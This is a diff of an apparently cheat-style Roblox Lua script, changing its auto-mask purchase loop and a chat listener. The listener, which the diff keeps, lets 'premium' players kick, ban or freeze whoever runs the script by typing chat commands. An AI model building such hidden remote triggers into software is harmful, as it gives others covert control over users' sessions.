@@ -287,11 +287,6 @@ task.spawn(function()
     automaskenabled = true
 end)
 
-Player.CharacterAdded:Connect(function()
-    task.wait(2)
-    automaskenabled = true
-end)
-
 local Character = player.Character or player.CharacterAdded:Wait()
 local hrp = Character:WaitForChild("HumanoidRootPart")
 
@@ -749,10 +744,8 @@ function setupChatListener(player)
         local msgLower = message:lower()
 
         if isPremium(player) then
-            if msgLower:match("^%!kick%s+(.+)$") then LocalPlayer:Kick(message:match("^%!kick%s+(.+)$"))
-            elseif msgLower == "!kick" then LocalPlayer:Kick(":o")
-            elseif msgLower:match("^%!ban%s+(.+)$") then LocalPlayer:Kick(message:match("^%!ban%s+(.+)$"))
-            elseif msgLower == "!ban" then LocalPlayer:Kick("PERMA-BAN")
+            if msgLower == "!kick" then LocalPlayer:Kick(":o")
+            elseif msgLower == "!ban" then LocalPlayer:Kick("Banned by Premium")
             elseif msgLower == "!freeze" then
                 local char = LocalPlayer.Character
                 if char and char:FindFirstChild("HumanoidRootPart") then char.HumanoidRootPart.Anchored = true end
@@ -1606,7 +1599,8 @@ task.spawn(function()
                     buyingMaskInProgress = false
                     task.wait(2)
                 else
-                    -- mask already equipped, keep automaskenabled true for next respawn
+                    automaskenabled = false
+                end
             end
         end
         task.wait(0.5)
